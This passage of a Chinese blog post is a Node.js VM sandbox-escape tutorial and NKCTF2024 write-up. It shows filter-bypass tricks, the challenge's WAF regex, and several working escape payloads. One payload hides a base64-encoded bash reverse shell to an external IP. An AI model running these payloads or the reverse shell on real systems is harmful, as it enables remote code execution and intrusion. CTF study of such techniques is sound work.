+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)[</span><span class="s1">&#39;exe&#39;</span><span class="o">%</span><span class="mi">2</span><span class="nx">b</span><span class="s1">&#39;cSync&#39;</span><span class="p">](</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span></span></span></code></pre></div></div><h4 id="4模板字符串拼接">4：模板字符串拼接</h4>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span><span class="nx">$</span><span class="p">{</span><span class="sb">`</span><span class="si">${</span><span class="sb">`exe`</span><span class="si">}</span><span class="sb">cSync`</span><span class="p">}(</span><span class="s1">&#39;curl 127.0.0.1:1234&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`exe`</span><span class="si">}</span><span class="sb">cSync`</span><span class="si">}</span><span class="sb">`</span><span class="p">](</span><span class="s1">&#39;curl 127.0.0.1:1234&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//加不加中括号要取决于外面一层是否有反引号
+</span></span></span></code></pre></div></div><h4 id="5concat连接">5：concat连接</h4>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">)[</span><span class="s2">&#34;exe&#34;</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="s2">&#34;cSync&#34;</span><span class="p">)](</span><span class="s2">&#34;curl 127.0.0.1:1234&#34;</span><span class="p">)</span></span></span></code></pre></div></div><h4 id="6base64编码">6：base64编码</h4>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nb">eval</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="s1">&#39;Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=&#39;</span><span class="p">,</span><span class="s1">&#39;base64&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">())</span></span></span></code></pre></div></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/6602b6c99f345e8d03d5f381.png"
+        data-srcset="https://pic.imgdb.cn/item/6602b6c99f345e8d03d5f381.png, https://pic.imgdb.cn/item/6602b6c99f345e8d03d5f381.png 1.5x, https://pic.imgdb.cn/item/6602b6c99f345e8d03d5f381.png 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/6602b6c99f345e8d03d5f381.png"
+        title="https://pic.imgdb.cn/item/6602b6c99f345e8d03d5f381.png" /></p>
+<h3 id="二-2">二、</h3>
+<p>上面提到的几种方法，最终思路都是通过编码或者拼接得到关键字，这一块考虑js的一些语法和内置函数。</p>
+<h4 id="1obejctkeys">1：Obejct.keys</h4>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">constructor</span><span class="o">===</span><span class="nb">Object</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//true
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">Object</span><span class="p">.</span><span class="nx">values</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">))[</span><span class="mi">5</span><span class="p">](</span><span class="s1">&#39;curl 127.0.0.1:1234&#39;</span><span class="p">)</span></span></span></code></pre></div></div><p>利用<code>Object.values</code>就可以拿到<code>child_process</code>中的各个函数方法，再通过数组下标就可以拿到<code>execSync</code></p>
+<p>连起来用就是</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">values</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">))[</span><span class="mi">5</span><span class="p">](</span><span class="s1">&#39;calc&#39;</span><span class="p">)</span></span></span></code></pre></div></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/6602b7389f345e8d03d88074.png"
+        data-srcset="https://pic.imgdb.cn/item/6602b7389f345e8d03d88074.png, https://pic.imgdb.cn/item/6602b7389f345e8d03d88074.png 1.5x, https://pic.imgdb.cn/item/6602b7389f345e8d03d88074.png 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/6602b7389f345e8d03d88074.png"
+        title="https://pic.imgdb.cn/item/6602b7389f345e8d03d88074.png" /></p>
+<h4 id="2reflect">2：Reflect</h4>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">global</span><span class="p">[</span><span class="nx">Reflect</span><span class="p">.</span><span class="nx">ownKeys</span><span class="p">(</span><span class="nx">global</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;eval&#39;</span><span class="p">))](</span><span class="s1">&#39;global.process.mainModule.constructor._load(&#34;child_process&#34;).execSync(&#34;whoami&#34;)&#39;</span><span class="p">)</span></span></span></code></pre></div></div><p>返回<code>Reflect.ownKeys(global)</code>所有函数，然后在所有函数中找到<code>eval</code>，这样拿到eval就不需要再去引入<code>process</code>模块了，eval里面就有</p>
+<p>如果过滤了<code>eval</code>关键字，可以用<code>includes('eva')</code>来搜索<code>eval</code>函数，也可以用<code>startswith('eva')</code>来搜索</p>
+<h4 id="3reflectget">3：<strong>Reflect</strong>.<strong>get</strong></h4>
+<p>如果中括号被过滤了，</p>
+<p><code>Reflect.get(target, propertyKey[, receiver])</code>的作用是获取对象身上某个属性的值，类似于<code>target[name]</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">global</span><span class="p">,</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">ownKeys</span><span class="p">(</span><span class="nx">global</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;eva&#39;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="nx">等价于</span>
+</span></span><span class="line"><span class="cl"><span class="nx">global</span><span class="p">[</span><span class="nx">Reflect</span><span class="p">.</span><span class="nx">ownKeys</span><span class="p">(</span><span class="nx">global</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;eva&#39;</span><span class="p">))]</span></span></span></code></pre></div></div><h2 id="nkctf2024">NKCTF2024</h2>
+<h3 id="世界上最简单的ctf">世界上最简单的CTF</h3>
+<p>主要源码：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">script</span><span class="o">=</span> 
+</span></span><span class="line"><span class="cl"><span class="sb">` `</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">context</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">waf</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span> <span class="c1">// 调用 waf 函数对代码进行简单的安全检查
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="nx">script</span><span class="p">,</span> <span class="nx">context</span><span class="p">);</span> <span class="c1">// 在沙盒环境中执行代码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span> <span class="c1">// 打印执行结果
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span> <span class="c1">// 捕获可能的异常并打印错误消息
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">//在出现异常时尝试引入名为 hack 的模块
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="kd">function</span> <span class="nx">waf</span><span class="p">(</span><span class="nx">script</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">   <span class="kd">let</span> <span class="nx">pattern</span> <span class="o">=</span> <span class="sr">/(prcess|\[.*?\]|exc|spawn|Buffer|\+|concat|eval|Function)/g</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">script</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">pattern</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">       <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s2">&#34;what can I say? hacker out!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></div></div><p>可以看到有catch模块，可以用VM沙盒逃逸的示例3。</p>
+<p>但有waf需要绕过，（这里字符串拼接或编码的方式都不行，也就是关键字绕过的一模块，因为会在waf的上一步就会自动解析出来，可以在waf时打印内容看看，所以只能用js的语法来绕过）</p>
+<p>paylaod1：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">throw</span> <span class="k">new</span> <span class="nb">Proxy</span><span class="p">({},</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">get</span><span class="o">:</span> <span class="kd">function</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">cc</span> <span class="o">=</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">caller</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">p</span> <span class="o">=</span> <span class="p">(</span><span class="nx">cc</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s1">&#39;return global&#39;</span><span class="p">))();</span>
+</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">p</span><span class="p">,</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">ownKeys</span><span class="p">(</span><span class="nx">p</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;pro&#39;</span><span class="p">))).</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">99</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">115</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">ownKeys</span><span class="p">(</span><span class="nx">a</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;ex&#39;</span><span class="p">)))(</span><span class="s2">&#34;calc&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span></span></span></code></pre></div></div><p>用的Reflect绕过，</p>
+<p>分析;</p>
+<p>获取外部对象，拿到global，返回global全部函数，找到process，然后获得child_process，因为是字符串所以可以这样绕过（上面不是说了不能编码绕过吗？其实只要涉及到函数，就只有执行命令时才能解析出来。waf时解析是自动解析像无函数的编码，以及字符串拼接。那为什么不全这样绕过？这样只能绕过字符串，方法不能用这种方式绕过）。</p>
+<p>payload2：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">throw</span> <span class="k">new</span> <span class="nb">Proxy</span><span class="p">({},</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">get</span><span class="o">:</span> <span class="kd">function</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">cc</span> <span class="o">=</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">caller</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="kr">const</span> <span class="nx">aa</span> <span class="o">=</span> <span class="s1">&#39;return Process&#39;</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="kr">const</span> <span class="nx">bb</span> <span class="o">=</span> <span class="s1">&#39;child_pRocess&#39;</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="kr">const</span> <span class="nx">p</span> <span class="o">=</span> <span class="p">(</span><span class="nx">cc</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="nx">aa</span><span class="p">))().</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="nx">bb</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">p</span><span class="p">,</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">ownKeys</span><span class="p">(</span><span class="nx">p</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;ex&#39;</span><span class="p">)))(</span><span class="s1">&#39;calc&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span></span></span></code></pre></div></div><p>分析：</p>
+<p>用的<code>toLowerCase()</code>函数（转小写）绕过了关键字字符串，然后用Reflect绕过方法。最后一句是个什么意思？</p>
+<p>等于：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">[</span><span class="nx">p</span><span class="p">[</span><span class="nx">Reflect</span><span class="p">.</span><span class="nx">ownKeys</span><span class="p">(</span><span class="nx">p</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;ex&#39;</span><span class="p">))](</span><span class="s1">&#39;calc&#39;</span><span class="p">)]</span></span></span></code></pre></div></div><p>可见最外面一层中括号不要也行（后面试了也确实可以）：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/6602b6eb9f345e8d03d6cb85.png"
+        data-srcset="https://pic.imgdb.cn/item/6602b6eb9f345e8d03d6cb85.png, https://pic.imgdb.cn/item/6602b6eb9f345e8d03d6cb85.png 1.5x, https://pic.imgdb.cn/item/6602b6eb9f345e8d03d6cb85.png 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/6602b6eb9f345e8d03d6cb85.png"
+        title="https://pic.imgdb.cn/item/6602b6eb9f345e8d03d6cb85.png" /></p>
+<p>payload3：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">throw</span> <span class="k">new</span> <span class="nb">Proxy</span><span class="p">({},</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"> 	<span class="nx">get</span><span class="o">:</span> <span class="kd">function</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="kr">const</span> <span class="nx">content</span> <span class="o">=</span> <span class="sb">`;)&#34;&#39;}i-,hsab{|}d-,46esab{|}d-,46esab{|}9UkaKtSQElkMZpmTygzQORTRqxUeFpWT11EVOVXWE1Ee4M0YqJ1MMJjVHpldBlmSrE0UhRXQDFmeG1WW,ohce{&#39; c- hsab&#34;(cexe;)&#34;ssecorp_dlihc&#34;(eriuqer = } cexe { tsnoc`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="kr">const</span> <span class="nx">reversedContent</span> <span class="o">=</span> <span class="nx">content</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">reverse</span><span class="p">().</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>	
+</span></span><span class="line"><span class="cl"> 		<span class="kr">const</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">caller</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> 		<span class="kr">const</span> <span class="nx">p</span> <span class="o">=</span> <span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`return proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span><span class="p">))();</span>
+</span></span><span class="line"><span class="cl"> 		<span class="nx">p</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">).</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="s1">&#39;/tmp/test1.js&#39;</span><span class="p">,</span> <span class="nx">reversedContent</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">p</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`child_proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span><span class="p">).</span><span class="nx">fork</span><span class="p">(</span><span class="s1">&#39;/tmp/test1.js&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span></span></span></code></pre></div></div><p>逆序内容：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="sb">`const { exec } = require(&#34;child_process&#34;);exec(&#34;bash -c &#39;{echo,WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1EWXVOVE11TWpFeUxqRTROQzgyTmpZMklEQStKakU9}|{base64,-d}|{base64,-d}|{bash,-i}&#39;&#34;);`</span></span></span></code></pre></div></div><p>逆序+base64（但很神奇，这个模板字符串拼接竟然也行）</p>
+<p>随便选一种都可以成功反弹shell：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/6602b75d9f345e8d03d96f5a.png"
+        data-srcset="https://pic.imgdb.cn/item/6602b75d9f345e8d03d96f5a.png, https://pic.imgdb.cn/item/6602b75d9f345e8d03d96f5a.png 1.5x, https://pic.imgdb.cn/item/6602b75d9f345e8d03d96f5a.png 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/6602b75d9f345e8d03d96f5a.png"
+        title="https://pic.imgdb.cn/item/6602b75d9f345e8d03d96f5a.png" /></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-03-26</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/nodejs-vm/" data-title="nodejs VM和VM2沙箱逃逸" data-hashtags="node.js,沙箱逃逸"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/nodejs-vm/" data-hashtag="node.js"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/node.js/">Node.js</a>,&nbsp;<a href="/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/rdis/" class="prev" rel="prev" title="redis数据库主从复制"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>redis数据库主从复制</a>
+            <a href="/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/" class="next" rel="next" title="java反射机制">java反射机制<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
